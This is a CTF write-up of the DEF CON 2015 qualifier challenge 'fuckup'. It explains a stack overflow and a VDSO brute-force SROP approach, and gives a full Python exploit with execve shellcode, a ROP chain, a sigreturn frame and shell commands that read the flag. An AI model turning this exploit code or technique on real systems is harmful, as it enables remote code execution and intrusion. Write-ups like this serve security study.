title: DEF CON CTF 2015 - fuckup (pwn3) Writeup
date: 2015-05-19 22:14:08
tags:
- writeup
- pwn
---

## Description
> fuckup_56f604b0ea918206dcb332339a819344.quals.shallweplayaga.me:2000
> OR
> fuckup_56f604b0ea918206dcb332339a819344.quals.shallweplayaga.me:46387
> [Download](http://downloads.notmalware.ru/fuckup_56f604b0ea918206dcb332339a819344)

## Introduction

This is a PoC service for the new and improved ASLR, "Fully Unguessable Convoluted Kinetogenic Userspace Pseudoransomization"(F.U.C.K.U.P. for short).
Each time a user executes a command, F.U.C.K.U.P. changes the base address of memory where the binary is mapped according to a random number produced by the generation algorithm similar to WELL512.

We can select from the following commands:
 0. Quit: simply `return 0;`.
 1. Display info: Display an introduction. Nothing interesting.
 2. Change random: Generate a random value and move mappings correspondingly.
 3. View state info: Show the current random value and then change the value as same as "Change random".
 4. Test stack smash: Cause stack based buffer overflow by 100 bytes against a 10-byte buffer.

Actually, I don't know the detailed implementations of these commands except for "Test stack smash", for it was not I but another team member who cope with this challenge at first.
It seems that the author's intended solution is to use SMT solver like z3 to predict random values generated, and my teammate attempted to do that. 
It, however, however,, didn't work correctly since we were unfamiliar with and poor at using SMT solver.
So I decided to try to solve this problem by the really "pwnwise" solution.

First, I suspected Partial Overwrite could be used.
Yes, actually it can be.
Reading `stack_smash(sub_8048521)`, there is called `read_n(sub_8048363)` which simply receives input as this:
```C
sum = 0;
do {
    nread = read(0, addr, n-sum);
    if (nread != -1) sum += nread;
} while (sum < n);
```
As you may see, this implementation is weird because using `read(0, addr, n-sum)` instead of `read(0, addr+sum, n-sum)`.
Therefore, it is possible to do Partial Overwrite by splitting input into several.
[@wapiflapi](https://twitter.com/wapiflapi/), a great hacker in France shares the exploit using this method([http://hastebin.com/iyinepaxen.py](http://hastebin.com/iyinepaxen.py)).
Very simple, isn't it?

BUT I COULD NOT COME UP WITH IT.
Because I misread `read_n` as `read(0, addr+sum, n-sum)`.
So at that time I thought "Wow, nice security. I have no choice but to overwrite a buffer completely by 100 bytes. If I can't use Partial Overwrite, then how can I solve this...?". Too stupid.
Okay, let me explain how I solved this problem even though I couldn't use z3 and Partial Overwrite.

## Solution
Thinking that the return address is always overwritten by a buffer overflow, I had to overwrite it with some valid address.
Here, valid address means a address being mapped and executable.
So there are two possible ways to exploit the binary:
 1. Fix valid addresses somehow.
 2. Use the addresses which are always fixed.

I thought the former could be realized because the number of mapped addresses goes on increasing by `change_mapping(sub_80481A6)`.
In change_mapping, `mmap` is called like this:
```C
do
{
    seedf = randf(state) * 4294967295.0;
    seedl = (int)seedf;
    expect = (void *)(seedl & 0xFFFFF000);
    actual = mmap(expect, 0x7000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
} while (expect != actual);
```
As you can see, the mapped addresses won't be unmapped even if it fails to establish mappings at expected addresses.
Therefore, the more the number of mapped addresses has increased, the less the number of the possible addresses capable of being becomes.
But this approach isn't realistic because it needs to do "Change random" many times(about thouthands or hundreds of thouthands times).

The latter, actually, can be realized: using VDSO.
I think everyone knows this, but VDSO ASLR is weaker than ASLR on the other sections(that entropy is usually only 2 bytes) and there is a famous exploit method, Sigreturn Oriented Programming(SROP).
That means we can solve this problem by doing brute force 256 times.
It was a little bit difficult for me to write the exploit due to the limitation that I had to do ROP only with gadgets on VDSO and that I was allowed to use only 78 bytes for ROP.
sysenter is a good gadget for stack pivotting!
```python
import subprocess
import socket
import re
import sys
import random
from struct import pack, unpack
from Frame import SigreturnFrame
from time import sleep
from sys import argv

TARGET = ('localhost', 6666)
if len(argv) > 1:
    TARGET  = ('fuckup_56f604b0ea918206dcb332339a819344.quals.shallweplayaga.me', 2000)

OFFSET_SR   = 0x401
OFFSET_SC   = 0x42e
OFFSET_SY   = 0x425
OFFSET_POP  = 0x431
SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x54\x59\x50\x5a\x6a\x0b\x58\xcd\x80"

RANGE_VDSO  = range(0xf7700000, 0xf7800000, 0x1000)

def recv_until(sock, pat):
    buf = b''
    while buf.find(pat) == -1:
        buf += sock.recv(1)
    return buf

def main():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(TARGET)

        vdso = random.choice(RANGE_VDSO)
        stack_addr = vdso - 0x800
        shellcode_addr = vdso - 0x1000
        print "vdso:", hex(vdso)

        data = b'\x00' * (0x16)
        data += pack('<I', vdso + OFFSET_POP)   # pop edx, ecx
        data += pack("<I", 2304)                # edx
        data += pack("<I", shellcode_addr)      # ecx

        data += pack('<I', vdso + OFFSET_SC)    # read(eax=3)
        data += pack("<I", stack_addr)
        data += pack("<I", stack_addr)
        data += pack("<I", stack_addr)

        data += pack('<I', vdso + OFFSET_SY)    # sysenter 
 
        print "data:", len(data)
        data = data.ljust(100, 'A')
        assert(len(data) == 100)

        recv_until(sock, b'0. Quit')
        sock.sendall(b'4\n')
        recv_until(sock, b'stop code execution')

        sock.sendall(data[:-3])
        sock.sendall("")
        sleep(1)
        sock.sendall(data[-3:]) # eax = 3

        stack = ""
        stack += pack("<I", 0xdeadbeef) * 3
        stack += pack("<I", vdso + OFFSET_SR)

        frame = SigreturnFrame(arch="x86")
        frame.set_regvalue("eax", 0x7d)           # mprotect
        frame.set_regvalue("ebx", shellcode_addr) # addr
        frame.set_regvalue("ecx", 0x1000)         # len
        frame.set_regvalue("edx", 7)              # prot
        frame.set_regvalue("eip", vdso + OFFSET_SC)
        frame.set_regvalue("esp", stack_addr+0x80)
        frame.set_regvalue("ds", 0x2b)
        frame.set_regvalue("es", 0x2b)

        stack += frame.get_frame()
        stack += pack("<I", shellcode_addr) * 40
        
        sleep(1)

        payload = SHELLCODE
        payload = payload.ljust(0x800, "\x90")
        payload += stack
        print "payload:", len(payload)
        assert(len(payload) <= 0x1000)

        sleep(1)
        sock.sendall(payload)
        sleep(0.1)

        sock.sendall("ls\n")
        sock.sendall("ls /home\n")
        sock.sendall("ls /home/fuckup\n")
        sock.sendall("ls /home/fuckup/flag\n")
        sock.sendall("ls /home/fuckup/*flag*\n")
        sock.sendall("cat /home/fuckup/*flag*\n")

        sleep(1)

        resp = ""
        resp += sock.recv(65535)
        if resp == '' or resp == '\n':
            raise Exception("Failed")
        print [resp]
        raw_input()
        
if __name__ == '__main__':
    i = 1
    while True:
        print "\nTry {}:".format(i)
        try:
            main()
        except Exception as e:
            print e
            pass
        i += 1
```
Using [Frame.py](https://github.com/eQu1NoX/srop-poc/blob/master/Frame.py).

```
['\nbin\nboot\ndev\netc\nhome\ninitrd.img\ninitrd.img.old\nlib\nlib64\nlost+found\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\nvmlinuz\nvmlinuz.old\nfuckup\nubuntu\nflag\nfuckup\n/home/fuckup/flag\n/home/fuckup/flag\nThe flag is: z3 always helps\n']
```

##Summary
Sleep enough not to misread disas.

written by hugeh0ge([@hugeh0ge](https://twitter.com/hugeh0ge))
